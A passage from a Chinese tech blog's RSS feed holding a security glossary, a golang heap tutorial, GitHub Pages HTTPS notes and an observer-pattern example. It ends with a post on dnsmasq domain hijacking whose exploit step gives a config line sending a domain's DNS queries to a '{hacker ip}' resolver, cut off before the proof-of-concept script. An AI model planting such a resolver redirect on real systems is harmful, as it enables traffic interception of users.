一种计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。 每一段gadget通常结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。<br>  ROP是一种高级的堆栈溢出攻击。这类攻击往往利用操作堆栈调用时的程序漏洞，通常是缓冲区溢出。在缓冲区溢出中，在将数据存入内存前未能正确检查适当范围的函数会收到多于正常承受范围的数据，如果数据将写入栈，多余的数据会溢出为函数变量分配的空间并覆盖替换返回地址（return address）。在原本用以重定向控制流并返回给调用者的地址被覆盖替换后，控制流将改写到新分配的地址。<br>  <a href="https://bbs.pediy.com/thread-223798.htm">更多详情</a></p></li><li><p><code>RCE</code> (Remote Code Execution)<br>  远程代码执行</p></li><li><p><code>EDR</code> (Endpoint Detection and Response) 端点检测与响应<br>  指端上安全检测。有时特指办公网内对员工机器的风险监控。<br>  <a href="https://www.esecurityplanet.com/products/top-endpoint-detection-response-solutions.html">更多详情</a></p></li><li><p><code>CVSS</code> (Common Vulnerability Scoring System) 通用漏洞评分系统<br> CVSS分值遵循被广泛采纳的行业标准，根据漏洞的多种属性通过公式计算得出。主要用于量化漏洞的严重程度。<br> 在CVSS v3.0评分体系中，不同分值代表的漏洞严重程度如下：   </p><ul><li>0.0：无漏洞   </li><li>0.1~3.9：低危   <ul><li>可导致本地拒绝服务的漏洞。  </li><li>其他危害较低的漏洞。</li></ul></li><li>4.0~6.9：中危  <ul><li>需要进行交互才能影响用户的漏洞。  </li><li>可导致普通越权操作的漏洞。  </li><li>通过本地修改配置或获取信息之后，可进一步利用的漏洞。</li></ul></li><li>7.0~8.9：高危  <ul><li>可间接获取服务器和应用系统的普通权限的漏洞。  </li><li>可导致任意文件读取、下载、写入、或删除的漏洞。  </li><li>可导致敏感信息泄漏的漏洞。  </li><li>可直接导致业务中断、或远程拒绝服务的漏洞。</li></ul></li><li>9.0~10.0：严重  <ul><li>可直接获取服务器系统权限的漏洞。  </li><li>可直接获取重要的敏感信息，导致数据泄漏的漏洞。  </li><li>可直接导致敏感信息越权访问的漏洞。  </li><li>可造成大范围影响的其他漏洞。</li></ul></li></ul></li><li><p><code>NTA</code> (Network Traffic Analysis) 网络流量分析<br>  一般指对网络流量进行分析的安全产品。</p></li><li><p><code>SIEM</code> (Security Infomation and Events Manager) 安全信息和事件管理<br>  简单地说，SIEM是一个由多个监视和分析组件组成的安全系统，旨在帮助组织检测和减轻威胁。<br>  如上所述，SIEM将许多其他安全规程和工具结合在一个综合的框架下:  </p><ul><li>日志管理(LMS)——用于传统日志收集和存储的工具。  </li><li>安全信息管理(SIM)——集中于从多个数据源收集和管理与安全相关的数据的工具或系统。例如，这些数据源可以是防火墙、DNS服务器、路由器和防病毒应用程序。  </li><li>安全事件管理(SEM)——基于主动监视和分析的系统，包括数据可视化、事件相关性和警报。</li></ul><p>  SIEM是今天的术语管理系统,所有上述合并到一个层,知道如何从分布式自动收集和处理信息的来源,将它存储在一个集中位置,不同事件之间的关联,并根据这些信息生成警报和报告。  </p></li><li><p><code>SOC</code> (Security Operation Center) 安全运营中心<br>  一般一个较完善的SOC应该具有以下模块：   </p><ul><li>安全设备集中管理<ul><li>统一日志管理（集中监控）</li><li>统一配置管理（集中管理）</li><li>各安全产品和系统的统一协调和处理（协同处理）</li><li>设备自动发现</li></ul></li><li>安全服务集中管理<ul><li>安全培训管理</li><li>风险分析自动化</li></ul></li><li>业务流程的安全管理<ul><li>初步的资产管理（资产、人员）</li><li>安全管理系统与网关系统的联动（协调处理）</li><li>与其他信息系统的高度融合</li></ul></li><li>组织的安全管理<ul><li>组织构成</li><li>组织责任</li></ul></li></ul></li><li><p><code>IOC</code> (Indicators of Compromise) 威胁指示<br>  IOC在取证时常常被描述为用于指示网络安全性已被破坏的计算机证据。<br>  在网络中,IOC可能是一个MD5哈希值,一个C2结构域或硬编码的IP地址,一个注册表项,文件名等。这些IOC都在不断变化来保护网络的安全。<br>  同样,根据2012年MITRE的定义,这显然是观测量,而不是IOC本身。Ross和Breem甚至指出这种与IOC之间的联系(见下文),以及IOC是如何“不断变化的”。他提道: “在网络领域中,IOA的力量会展示一个攻击者是如何侵入你的计算机,访问的文件,破解密码,并最终盗取数据的。”<br>  <a href="https://www.anquanke.com/post/id/83830">更多详情</a>  </p></li><li><p><code>RASP</code>（Runtime Application Self-Protection）运行时应用自我保护<br>  RSAP将自身注入到应用程序中，与应用程序融为一体，实时监测、阻断攻击，使程序自身拥有自保护的能力。并且应用程序无需在编码时进行任何的修改，只需进行简单的配置即可。<br>  <a href="http://blog.nsfocus.net/rasp-tech/">更多详情</a>  </p></li><li><p><code>TIP</code> (Threat Intelligence Platform) 威胁情报平台<br>  是一个可以支持整个安全团队的平台，支持执行日常事件响应、网络防御和威胁分析。成熟的 TIP 用于日常运营，支持对攻击的阻止和处理，支持战略决策和流程改进，它可以帮助实现企业威胁情报计划对威胁情报进行全生命周期的管理。威胁情报的生命周期包括：威胁情报需求分析、收集、分析、使用。</p></li></ul><h2 id="工作中的快捷表达"><a href="#工作中的快捷表达" class="headerlink" title="工作中的快捷表达"></a>工作中的快捷表达</h2><ul><li><p><code>WIP</code> (Work In Progress) 半成品<br>  表示任务在进行中，未完成   </p></li><li><p><code>FYI</code> (For Your Information) 信息同步<br>  表示将信息同步给你，注意看一下</p></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li><p><code>kerberos</code> 基于C&#x2F;S架构的网络认证授权协议<br>  协议介绍：<a href="https://zh.wikipedia.org/wiki/Kerberos">维基百科</a><br>  相关缩写：  </p><ul><li>AS（Authentication Server）&#x3D; 认证服务器  </li><li>KDC（Key Distribution Center）&#x3D; 密钥分发中心  </li><li>TGT（Ticket Granting Ticket）&#x3D; 票据授权票据，票据的票据  </li><li>TGS（Ticket Granting Server）&#x3D; 票据授权服务器  </li><li>SS（Service Server）&#x3D; 特定服务提供端</li></ul></li><li><p><code>OLAP</code> (Online Analytical Processing) 联机分析处理<br>  OLAP是数据仓库系统的主要应用，支持复杂的分析操作，侧重决策支持，并且提供直观易懂的查询结果。如 hive，clickhouse 等<br>  也叫DSS决策支持系统，就是我们说的数据仓库。在这样的系统中，语句的执行量不是考核标准，因为一条语句的执行时间可能会非常长，读取的数据也非常多。所以，在这样的系统中，考核的标准往往是磁盘子系统的吞吐量（带宽），如能达到多少MB&#x2F;s的流量。  </p></li><li><p><code>OLTP</code> (Online Transaction Processing) 联机事务处理<br>  OLTP是传统的关系型数据库的主要应用，主要是基本的、日常的事务处理，例如银行交易。典型的OLTP系统有电子商务系统、银行、证券等，如美国eBay的业务数据库，就是很典型的OLTP数据库。<br>  表示事务性非常高的系统，一般都是高可用的在线系统，以小的事务以及小的查询为主，评估其系统的时候，一般看其每秒执行的Transaction以及Execute SQL的数量。在这样的系统中，单个数据库每秒处理的Transaction往往超过几百个，或者是几千个，Select 语句的执行量每秒几千甚至几万个。  </p></li><li><p><code>ETL</code> (Extract Transform Load) 数据处理<br>  用于描述将数据从来源端经过抽取（extract）、转换（transform）、加载（load）到目的端的过程。<br>  即从数据源抽取数据出来，进行清洗加工转换，然后加载到定义好的数据仓库模型中去。<br>  目的是将企业中分散、零乱、标准不统一的数据整合到一起，为企业的决策提供分析依据。</p></li><li><p><code>SLI</code> (Service Level Indicator)</p><ul><li>A carefully defined quantitative measure of some aspect of the level of service that is provided.</li></ul></li><li><p><code>SLO</code> (Service Level Objective)</p><ul><li>A target value or range of values for a service level that is measured by an SLI, e.g.  e.g. SLI &gt;&#x3D; 99.95%</li></ul></li><li><p><code>SLA</code> (Service Level Agreement)</p><ul><li>An explicit or implicit contract with your users that includes consequences of meeting (or missing) the SLOs they contain.</li></ul></li><li><p><code>idP</code> (Identity Provider) 第三方身份提供商  </p><ul><li>用于第三方登录的身份服务提供商</li></ul></li><li><p><code>IAM</code> (Identity and Access Management) 身份访问管理</p><ul><li>基于用户身份的资源访问权限管理</li></ul></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://xchens.cn/tags/%E5%AE%89%E5%85%A8/">安全</category>
      
      <category domain="https://xchens.cn/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      
      <comments>https://xchens.cn/posts/f0dba9bd/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>对golang里&quot;堆&quot;结构的一次实践</title>
      <link>https://xchens.cn/posts/eeff0c5/</link>
      <guid>https://xchens.cn/posts/eeff0c5/</guid>
      <pubDate>Wed, 13 Jan 2021 06:48:49 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p&gt;对golang标准库堆的深入分析与实践 ^.^&lt;br&gt;阅读须知：本文假设读者了解堆的数据结构，并明白堆排序的原理。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;堆排序（heapsort）&quot;&gt;&lt;a href=&quot;#堆排序（heapsort）</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>对golang标准库堆的深入分析与实践 ^.^<br>阅读须知：本文假设读者了解堆的数据结构，并明白堆排序的原理。  </p></blockquote><h2 id="堆排序（heapsort）"><a href="#堆排序（heapsort）" class="headerlink" title="堆排序（heapsort）"></a>堆排序（heapsort）</h2><p>堆一般分为最小堆和最大堆。堆排序是指利用堆这种数据结构所设计的一种排序算法。堆是一个近似完全二叉树的结构，并同时满足堆的性质：即子节点的键值或索引总是小于（或者大于）它的父节点。  </p><h2 id="heap-in-golang"><a href="#heap-in-golang" class="headerlink" title="heap in golang"></a>heap in golang</h2><p>在golang的 <code>container/heap</code> 标准库中提供了堆的实现，但是关于它的介绍却比较少。<br>不少介绍只是简单的搬运的官方的例子。因此这里仔细的介绍了一下具体代码实现的细节。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://golang.org/pkg/container/heap/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个代码示例展示了如何使用内建heap接口实现一个整数堆</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;container/heap&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个int类型构成的最小堆</span></span><br><span class="line"><span class="keyword">type</span> IntHeap []<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span></span> Len() <span class="type">int</span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(h) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123; <span class="keyword">return</span> h[i] &lt; h[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span></span> Swap(i, j <span class="type">int</span>)      &#123; h[i], h[j] = h[j], h[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span></span> Push(x <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">    <span class="comment">// Push 和 Pop 使用指针接收器，因为它们修改了切片的长度而不仅仅是切片指向的内容</span></span><br><span class="line">    <span class="comment">// golang 使用值拷贝的方式传输参数，append返回的可能是一个全新的切片，如果不用指针会导致本次赋值失效。</span></span><br><span class="line">*h = <span class="built_in">append</span>(*h, x.(<span class="type">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">old := *h</span><br><span class="line">n := <span class="built_in">len</span>(old)</span><br><span class="line">x := old[n<span class="number">-1</span>]</span><br><span class="line">*h = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个例子插入了多个 int 到 IntHeap 中，</span></span><br><span class="line"><span class="comment">// 检查最小值然后按权值进行移除。（弹出堆顶）</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">h := &amp;IntHeap&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;</span><br><span class="line">heap.Init(h)</span><br><span class="line">heap.Push(h, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;minimum: %d\n&quot;</span>, (*h)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> h.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d &quot;</span>, heap.Pop(h))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考上述官方代码示例，可以知道要使用这个heap接口，必须自己实现这些方法:   </p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Len() <span class="type">int</span></span><br><span class="line">Less(i, j <span class="type">int</span>) <span class="type">bool</span></span><br><span class="line">Swap(i, j)</span><br><span class="line">Push(x <span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">Pop() <span class="keyword">interface</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>Len</code> 和 <code>Swap</code> 方法比较直观，分别是返回元素个数和交换元素位置。</p><p><code>Less</code> 方法比较重要，它比较了第 <code>i</code> 和 <code>j</code> 个元素，返回比较结果。这关系着 <code>heap</code> 生成的是最小堆还是最大堆。<br><strong>当 <code>i &lt; j</code> 且 <code>Less(i, j) == true</code> 时，获得最小堆。反之则是最大堆。</strong></p><p><code>Push</code> 方法把元素添加到尾部， <code>Pop</code> 方法把堆顶元素移出。</p><p>这里需要注意的是，如果自己另外实现堆方法，记住堆的内部存储是一个二叉树，第一个元素是堆顶，最后一个元素是堆尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内部存储：[1,2,3,4,5]</span><br><span class="line">堆：</span><br><span class="line">         1</span><br><span class="line">       /   \</span><br><span class="line">      2     3</span><br><span class="line">     / \</span><br><span class="line">    4   5</span><br></pre></td></tr></table></figure><p>golang的堆接口会在实现好这些基本方法帮你自动维护堆的有序性。</p><p><code>func Init(h interface)</code><br>将一个乱序的堆进行排序，使之成为一个有效的堆</p><p><code>func Fix(h Interface, i int)</code><br>在修改第i个元素后，调用本函数修复堆，比删除第i个元素后插入新元素更有效率。</p><p><code>func Pop(h Interface) interface&#123;&#125;</code><br>向堆添加一个新元素</p><p><code>func Push(h Interface, x interface&#123;&#125;)</code><br>弹出并返回堆顶元素</p><p><code>func Remove(h Interface, i int) interface&#123;&#125;</code><br>删除堆中的第i个元素</p><ul><li>注意这里的Push&amp;Pop方法并不是我们自己实现的Push&amp;Pop，它会在我们实现的Push&amp;Pop基础上进行封装，确保可以仍然维护堆的性质。</li></ul>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/golang/">golang</category>
      
      <category domain="https://xchens.cn/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      
      <comments>https://xchens.cn/posts/eeff0c5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>https on github page</title>
      <link>https://xchens.cn/posts/37610144/</link>
      <guid>https://xchens.cn/posts/37610144/</guid>
      <pubDate>Tue, 12 Jan 2021 06:15:00 GMT</pubDate>
      
      <description>关于 github page 自定义域名支持 https 的一些探索</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>有些事太难了让人头疼，但有些事太简单了也让人害怕. </p></blockquote><h2 id="github-自定义域名"><a href="#github-自定义域名" class="headerlink" title="github &amp; 自定义域名"></a>github &amp; 自定义域名</h2><p>在 github page配置自定义域名出乎意料的简单，如下几步即可快速配置  </p><ul><li>设置域名的DNS解析，cname: username.github.io</li><li>在项目目录下放置一个<code>CNAME</code>文件，记录自定义域名</li><li>在 <code>setting</code> 中指定自定义域名</li></ul><p>github支持多种方式配置自定义域名，以上只是我自己实测过的其中一种，详情参考 <a href="https://docs.github.com/cn/free-pro-team@latest/github/working-with-github-pages/about-custom-domains-and-github-pages">官方文档：如何在github配置自定义域名</a></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>通过以上方式指定的自定义域名竟然是支持HTTPS的！！！<br>https的原理这里就不赘述了，总之是支持通过公私钥机制来帮助用户认证服务端的，但以上逻辑完全没有公私钥好不好。</p><p>难不成github替我签发了自定义域名的证书？？？</p><p>那么问题很明显，github page 它凭什么支持https？？</p><h2 id="同行怎么做的"><a href="#同行怎么做的" class="headerlink" title="同行怎么做的"></a>同行怎么做的</h2><p><a href="https://gitee.com/help/articles/4228#article-header4">码云：在gitee使用自定义域名</a><br>看完gitee的操作不由放下心来，人家是通过用户自行申请公私钥，然后上传的方式来提供https服务，一板一眼，令人舒适。</p><h2 id="揭秘"><a href="#揭秘" class="headerlink" title="揭秘"></a>揭秘</h2><blockquote><p>有钱能使鬼推磨   </p></blockquote><p>在<a href="https://github.blog/2018-05-01-github-pages-custom-domains-https/">github官方博客</a>上我找到了这样一句话：</p><blockquote><p>We have partnered with the certificate authority Let’s Encrypt on this project. As supporters of Let’s Encrypt’s mission to make the web more secure for everyone, we’ve officially become Silver-level sponsors of the initiative.<br>我们已经与证书颁发机构 Let’s Encrypt 合作了。 作为 Let’s Encrypt 的使命的支持者，该使命旨在为所有人提供更安全的网络，我们已正式成为该计划的银级赞助商。</p></blockquote><p>所以，github page 的 https 证书来历大概就能明白了，当用户配置了域名解析后，相当于向github证明了自己是该域名的owner，然后借助github的银级赞助商权限，直接向证书颁发机构申请了一套证书下来。</p><p>emm，所以说向github证明自己的效果等同于向证书颁发机构证明自己了 QaQ。</p><p>真是花里胡哨的操作，还是gitee好，不光能让用户感受到证书申请的流程，了解更多https相关知识，而且还费尽苦心把自定义域名功能放在收费区，让更多开发者明白开源不是白嫖。</p><p>（但认真的说，gitee page 提供的国内 cdn buff 确实值这个价，github 真的太慢太慢了）</p><p><br/><br/></p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/https/">https</category>
      
      
      <comments>https://xchens.cn/posts/37610144/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>漫谈设计模式 2 - 状态模式</title>
      <link>https://xchens.cn/posts/d2b0d310/</link>
      <guid>https://xchens.cn/posts/d2b0d310/</guid>
      <pubDate>Tue, 13 Oct 2020 03:43:00 GMT</pubDate>
      
      <description>常见设计模式的介绍与剖析。深入原理，不能错过的经典设计模式之状态模式。</description>
      
      
      
      
      
      <category domain="https://xchens.cn/tags/code-design/">code design</category>
      
      <category domain="https://xchens.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">设计模式</category>
      
      
      <comments>https://xchens.cn/posts/d2b0d310/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>漫谈设计模式 1 - 观察者模式</title>
      <link>https://xchens.cn/posts/83eac405/</link>
      <guid>https://xchens.cn/posts/83eac405/</guid>
      <pubDate>Sat, 10 Oct 2020 10:33:00 GMT</pubDate>
      
      <description>常见设计模式的介绍与剖析。深入原理，不能错过的经典设计模式之观察者模式（监听模式）。</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>观察者模式也称监听模式、发布&#x2F;订阅模式、模型&#x2F;视图模式、源&#x2F;监听器模式、从属者模式等，是一种对象行为型模式。  </p><p>其原理是在对象间定义一种<code>一对多</code>的依赖关系，当这个对象状态发生改变时，所有依赖它的对象都会被通知并自动更新。<br>核心是在被观察者与观察者之间建立一种自动触发的关系。  </p><h2 id="模型-python示例"><a href="#模型-python示例" class="headerlink" title="模型 - python示例"></a>模型 - python示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入 ABCMeta 和 abstractmethod 来定义抽象类和抽象方法</span></span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Observer</span>(metaclass=ABCMeta):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;`观察者`的基类&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, observable, <span class="built_in">object</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;各`观察者`各自实现此接口，等待被`被观察者`触发后执行相应动作&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Observable</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;`被观察者`的基类&quot;&quot;&quot;</span></span><br><span class="line">    def__ init__ (self):</span><br><span class="line">        self._observers = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addObserver</span>(<span class="params">self, observer</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;添加`观察者`&quot;&quot;&quot;</span></span><br><span class="line">        self._observers.append(observer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">removeObserver</span>(<span class="params">self, observer</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;移除`观察者`&quot;&quot;&quot;</span></span><br><span class="line">        self._observers.remove(observer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">notifyObservers</span>(<span class="params">self, <span class="built_in">object</span>=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;`被观察者`在事件发生时调用此方法来通知所有`观察者`&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> o <span class="keyword">in</span> self._observers:</span><br><span class="line">            o.update(self, <span class="built_in">object</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别实现`观察者`类实现Observer，`被观察者`类继承Observable</span></span><br><span class="line"><span class="comment"># `被观察者`实例调用基类的addObserver()方法来添加`观察者`实例</span></span><br><span class="line"><span class="comment"># 当`被观察者`实例运行时满足特定需求时，调用notifyObservers()方法触发激活所有`观察者`实例的update()方法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><h3 id="推模型-拉模型"><a href="#推模型-拉模型" class="headerlink" title="推模型 拉模型"></a>推模型 拉模型</h3><p>观察者模式可以根据侧重功能分为推模型和拉模型。</p><p>推模型指在事件触发时<code>被观察者</code>向<code>观察者</code>推送主题的详细信息，而拉模型则是只推送少量信息，由<code>观察者</code>自行决定是否需要拉取更多数据信息。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><ol><li>当多个对象的动作执行依赖于某个特定事件的发生   </li><li>当一个对象的更新需要关联更新多个对象</li></ol><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点</strong></p><ul><li>降低了目标与观察者之间的耦合关系，两者之间是抽象耦合关系  </li><li>目标与观察者之间建立了一套触发机制  </li><li>支持广播通信  </li><li>符合“开闭原则”的要求  <blockquote><p>在面向对象编程领域中，开闭原则规定“软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的”，这意味着一个实体是允许在不改变它的源代码的前提下变更它的行为。该特性在产品化的环境中是特别有价值的，在这种环境中，改变源代码需要代码审查，单元测试以及诸如此类的用以确保产品使用质量的过程。遵循这种原则的代码在扩展时并不发生改变，因此无需上述的过程。</p></blockquote></li></ul><p><strong>缺点</strong></p><ul><li>目标与观察者之间的依赖关系并没有完全解除，而且有可能出现循环引用  </li><li>当观察者对象很多时，通知的发布会花费很多时间，影响程序的效率</li></ul><p><br/><br/><br/><br/><br/><br/><br/><br/></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">【非原创声明】本文内容参考以下来源，此处仅做记录分享，如有侵权可联系删除 </span><br><span class="line">  1. 《人人都懂设计模式：从生活中领悟设计模式（python实现）》  </span><br><span class="line">  2. 菜鸟教程</span><br><span class="line">  3. 维基百科</span><br><span class="line">  4. 其他看完后忘了在哪但又确实很有用的的博客文章</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/code-design/">code design</category>
      
      <category domain="https://xchens.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">设计模式</category>
      
      
      <comments>https://xchens.cn/posts/83eac405/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Arbitrary domain name hijacking caused by misconfiguration in dnsmasq</title>
      <link>https://xchens.cn/posts/d8547337/</link>
      <guid>https://xchens.cn/posts/d8547337/</guid>
      <pubDate>Wed, 09 Sep 2020 08:50:00 GMT</pubDate>
      
      <description>Arbitrary domain name hijacking caused by misconfiguration in dnsmasq</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="dnsmasq"><a href="#dnsmasq" class="headerlink" title="dnsmasq"></a>dnsmasq</h1><blockquote><p>Dnsmasq provides network infrastructure for small networks: DNS, DHCP, router advertisement and network boot. It is designed to be lightweight and have a small footprint, suitable for resource constrained routers and firewalls. It has also been widely used for tethering on smartphones and portable hotspots, and to support virtual networking in virtualisation frameworks. Supported platforms include Linux (with glibc and uclibc), Android, *BSD, and Mac OS X. Dnsmasq is included in most Linux distributions and the ports systems of FreeBSD, OpenBSD and NetBSD. Dnsmasq provides full IPv6 support.  </p></blockquote><p><a href="http://www.thekelleys.org.uk/dnsmasq/doc.html">dnsmasq homepage</a></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><ol><li>add this config to <code>dnsmasq.conf</code> or <code>dnsmasq.d/poc.conf</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server=/a.net/&#123;hacker ip&#125;</span><br></pre></td></tr></table></figure>then restart the dnsmasq to activate this config.</li></ol><ul><li>dnsmasq.conf is usually at &#x2F;usr&#x2F;local&#x2F;etc&#x2F; if in mac os</li></ul><ol start="2"><li>run this code in the {hacker ip} - <code>poc.py</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 